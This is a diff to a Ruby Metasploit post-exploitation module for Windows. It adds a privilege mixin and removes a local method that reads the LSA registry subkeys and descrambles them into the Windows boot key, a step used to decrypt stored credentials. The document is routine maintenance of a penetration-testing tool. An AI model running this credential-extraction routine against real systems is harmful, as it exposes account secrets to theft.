@@ -12,6 +12,7 @@ require 'rex'
 
 class Metasploit3 < Msf::Post
 
+  include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Registry
 
   def initialize(info={})
@@ -50,28 +51,6 @@ class Metasploit3 < Msf::Post
     rescue ::Exception => e
       print_error("Cache setting not found...")
     end
-  end
-
-  def capture_boot_key
-    bootkey = ""
-    basekey = "System\\CurrentControlSet\\Control\\Lsa"
-
-    %W{JD Skew1 GBG Data}.each do |k|
-      ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, basekey + "\\" + k, KEY_READ)
-      return nil if not ok
-      bootkey << [ok.query_class.to_i(16)].pack("V")
-      ok.close
-    end
-
-    keybytes = bootkey.unpack("C*")
-    descrambled = ""
-    descrambler = [ 0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04 ]
-
-    0.upto(keybytes.length-1) do |x|
-      descrambled << [keybytes[descrambler[x]]].pack("C")
-    end
-
-    return descrambled
   end
 
   def capture_lsa_key(bootkey)
